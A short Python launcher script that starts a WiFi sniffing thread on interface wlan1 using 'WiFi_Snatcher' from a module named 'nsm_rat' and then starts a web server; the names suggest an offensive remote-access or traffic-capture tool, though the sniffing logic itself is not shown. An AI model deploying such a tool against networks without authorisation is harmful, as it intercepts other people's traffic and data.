# THIS WILL START MODULE WIDE LOGIC


# ETC IMPORTS
import threading


# NSM IMPORTS
from nsm_rat import WiFi_Snatcher
from nsm_server import Web_Server







class Main_Thread():
    """Module starts here"""



    @staticmethod
    def main(iface="wlan1"):
        """Start"""

        
        # START WiFi SNIFFING
        threading.Thread(target=WiFi_Snatcher.main, args=(iface, ), daemon=True).start()


        # START SERVER
        from nsm_server import Web_Server
        Web_Server.start()





if __name__ == "__main__":
    Main_Thread.main()